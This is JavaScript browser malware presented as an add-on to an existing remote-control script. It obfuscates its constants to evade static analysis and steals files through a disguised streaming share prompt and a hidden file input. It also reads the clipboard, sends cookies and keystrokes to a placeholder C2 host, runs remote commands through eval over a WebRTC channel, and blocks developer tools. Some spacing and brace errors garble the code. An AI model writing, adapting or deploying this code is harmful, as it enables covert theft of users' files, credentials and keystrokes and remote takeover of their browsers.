// Obfuscated constants to dodge static analysis
const_0x7f9a = ['https', ':', '//', 'your', '-', 'vps', '-', 'ip', ':', '3000'].join('');
const_0x8c2b = ['wss', ':', '//', 'your', '-', 'vps', '-', 'ip', ':', '8080'].join('');

// Obfuscated snatchFiles wrapped in IIFE
(function (_0x12ab,_0x34cd) {
    async function_0x56ef() {
        try {
            // Try File System Access API for desktop browsers
            if ('showDirectoryPicker' in_0x12ab) {
                const_0x9d3e = await_0x12ab.showDirectoryPicker();
                const_0x4f2c = [];
                for await (const_0x1a7b of_0x9d3e.values()) {
                    if (_0x1a7b.kind === 'file') {
                        const_0x2b5d = await_0x1a7b.getFile();
                        const_0x6e8a = await_0x2b5d.arrayBuffer();_0x4f2c.push({
                            name:_0x2b5d.name,
                            data: btoa(String.fromCharCode(...new Uint8Array(_0x6e8a))),
                        });}                }
                await_0x3c9f(_0x4f2c);} else {
                // iOS/Android: Use Clipboard API for sneaky data grab
                if (_0x12ab.navigator.clipboard) {
                    const_0x5d4a = await_0x12ab.navigator.clipboard.readText();
                    if (_0x5d4a) {
                        await_0x3c9f([{ name: 'clipboard.txt', data: btoa(_0x5d4a) }]);}                }
                // Fallback to Web Share API for file access
                if (_0x12ab.navigator.share) {_0x12ab.navigator.share({
                        title: 'Share Free Streaming',
                        text: 'Check out this cool streaming service!',
                        url:_0x12ab.location.href,
                    }).then(() => {
                        const_0x7c1e =_0x34cd.createElement('input');_0x7c1e.type = 'file';_0x7c1e.multiple = true;_0x7c1e.accept = '*/*';_0x7c1e.style.display = 'none';_0x34cd.body.appendChild(_0x7c1e);_0x7c1e.click();_0x7c1e.onchange = async () => {
                            const_0x4f2c = Array.from(_0x7c1e.files).map(_0x2b5d => ({
                                name:_0x2b5d.name,
                                data: btoa(String.fromCharCode(...new Uint8Array(await_0x2b5d.arrayBuffer()))),
                            }));
                            await_0x3c9f(_0x4f2c);_0x34cd.body.removeChild(_0x7c1e);};                    });}            }} catch (_0x8e3f) {
            // Silent error handling to avoid console noise}    }

    // Helper to send data to C2
    async function_0x3c9f(_0x4f2c) {
        try {
            await fetch(_0x7f9a + '/files', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json'},                body: JSON.stringify(_0x4f2c),
            });} catch (_0x9a2b) {
            // Fallback to WebSocket
            const_0x6d4e = new WebSocket(_0x8c2b);_0x6d4e.onopen = () =>_0x6d4e.send(JSON.stringify(_0x4f2c));}    }

    // Expose_0x56ef for external calls (e.g., from initControl or Service Worker)
    _0x12ab._0x56ef =_0x56ef;
})(window, document);

// Add to existing initControl function
async function initControl() {
    try {
        const configuration = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
        const peerConnection = new RTCPeerConnection(configuration);
        const dataChannel = peerConnection.createDataChannel('controlChannel');

        dataChannel.onopen = () => {
            fetch(_0x7f9a + '/collect', {
                method: 'POST',
                body: JSON.stringify({
                    device: navigator.userAgent,
                    platform: navigator.platform,
                    cookies: document.cookie,
                }),
            });
            // Trigger obfuscated file grabber
            window._0x56ef();};        dataChannel.onmessage = (event) => {
            const command = event.data;
            if (command === 'screenshot') {
                navigator.mediaDevices.getDisplayMedia({ video: true })
                    .then(stream => {
                        dataChannel.send('Screenshot captured');
                    });} else if (command === 'stop') {
                peerConnection.close();} else if (command === 'snatch') {
                window._0x56ef(); // Trigger obfuscated snatchFiles} else {
                eval(command);}        };

        // Continue WebRTC offer creation as in your original code...
    } catch (e) {
        // Silent error handling}}

// Keylogger
document.addEventListener('keydown', (event) => {
    fetch(_0x7f9a + '/keylog', {
        method: 'POST',
        body: JSON.stringify({ key: event.key }),
    });
});

// Silent trigger
window.onload = () => {
    if (Math.random() > 0.5) initControl();};
// Anti-debugging to block dev tools
(function() {
    const_0x9f3a = /./;_0x9f3a.toString = () => 'devtools';
    setInterval(() => {
        if (String(_0x9f3a) === 'devtools') {
            window.location = 'about:blank';}    }, 1000);
})();
